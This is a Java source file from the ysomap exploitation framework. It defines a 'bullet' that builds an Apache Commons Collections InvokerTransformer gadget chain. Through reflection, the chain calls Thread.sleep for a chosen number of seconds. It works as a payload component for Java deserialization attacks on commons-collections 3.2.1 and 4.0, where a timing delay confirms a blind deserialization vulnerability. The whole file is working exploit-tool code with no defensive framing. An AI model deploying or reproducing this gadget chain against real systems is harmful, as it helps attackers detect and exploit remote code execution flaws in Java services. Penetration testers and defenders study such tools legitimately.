package ysomap.bullets.collections;

import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;

import java.util.LinkedList;

/**
 * @author wh1t3P1g
 * @since 2020/10/27
 */
@Bullets
@Dependencies({"<=commons-collections 3.2.1", "<=commons-collections 4.0"})
@Details("执行后，延迟指定时间")
@Targets({Targets.JDK})
@Authors({ Authors.WH1T3P1G })
public class TransformerWithSleepBullet extends AbstractTransformerBullet{

    @NotNull
    @Require(name="sleep",detail="延迟时间, 单位秒")
    public String sleep;

    @NotNull
    @Require(name="version", type="int", detail = "commons-collections version, plz choose 3 or 4")
    public String version = "3";// 默认生成commonscollections 3.2.1

    @Override
    public Object getObject() throws Exception {
        initClazz(version);
        LinkedList<Object> transformers = new LinkedList<>();
        transformers.add(createConstantTransformer(Thread.class));
        transformers.add(createInvokerTransformer("getMethod",
                new Class[] {String.class, Class[].class }, new Object[] {"currentThread", new Class[0] }));
        transformers.add(createInvokerTransformer("invoke",
                new Class[] { Object.class, Object[].class }, new Object[] {null, new Object[0]}));
        transformers.add(createInvokerTransformer("sleep",
                new Class<?>[]{long.class}, new Object[]{ Integer.parseInt(sleep)*1000 }));
        return createTransformerArray(transformers);
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new TransformerWithSleepBullet();
        bullet.set("sleep", args[0]);
        bullet.set("version", args[1]);
        return bullet;
    }

}
